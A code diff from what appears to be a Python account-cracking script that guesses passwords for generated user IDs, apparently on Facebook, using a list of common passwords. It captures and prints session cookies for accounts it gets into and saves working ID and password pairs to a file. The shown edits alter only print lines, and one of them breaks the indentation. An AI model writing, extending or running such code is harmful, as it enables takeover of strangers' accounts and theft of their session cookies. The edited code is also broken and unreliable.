@@ -448,7 +448,7 @@ def b2():
             uid = kode+guru
             pwx=[guru,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar']
             yaari.submit(rcrack,uid,pwx,tl)
-    print(46*'-')
+   print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('THE PROCESS HAS BEEN COMPLETED')
@@ -504,7 +504,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\036[1;37m[Hassan💪-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                print('\039[1;37m [Hassan💪-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
                 open('Hassan -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
